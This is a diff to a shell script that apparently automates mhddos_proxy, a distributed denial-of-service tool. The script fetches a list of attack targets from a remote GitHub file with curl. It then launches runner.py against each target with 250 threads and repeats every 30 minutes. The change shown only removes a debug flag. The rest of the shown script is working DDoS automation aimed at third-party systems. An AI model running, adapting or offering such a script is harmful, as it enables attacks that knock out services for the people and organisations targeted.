@@ -13,7 +13,7 @@ vnstat="off"
 matrix="off"
 threads="-t 250"
 #rpc="--rpc 2000"
-export debug="--debug"
+#export debug="--debug"
 
 launch () {
 if [ ! -f "/usr/local/bin/gotop" ]; then
@@ -119,7 +119,7 @@ pkill -f start.py; pkill -f runner.py
       done
    for (( i=1; i<=list_size; i++ )); do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
-            python3 ~/multidd/mhddos_proxy/runner.py $cmd_line $threads $rpc $debug&
+            python3 ~/multidd/mhddos_proxy/runner.py $cmd_line $threads $rpc&
       done
 sleep 30m
 done
